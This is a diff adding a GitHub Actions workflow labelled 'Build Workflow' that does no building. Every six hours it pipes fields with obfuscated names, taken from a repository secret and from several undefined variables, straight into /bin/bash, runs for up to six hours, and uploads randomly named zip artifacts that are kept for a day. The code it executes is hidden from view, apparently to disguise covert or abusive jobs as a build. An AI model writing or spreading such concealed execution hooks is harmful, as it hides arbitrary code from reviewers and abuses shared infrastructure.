@@ -1,0 +1,33 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          ltt852: ${{ secrets.ltt852 }}
+        run: |
+          printf '%s' "$ltt852" | jq -r .ezl29 | /bin/bash
+          echo $rf43246 | jq -r .fhqf5 | /bin/bash
+          echo $xsh1 | jq -r .lu968 | /bin/bash
+          echo $hj2 | jq -r .qnkxx2 | /bin/bash
+          echo $xd748 | jq -r .bzqb06247 | /bin/bash
+          printf '%s' "$xzfr537" | jq -r .yi2 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: PMCAiNUl
+          path: "*.zip"
+          retention-days: 1
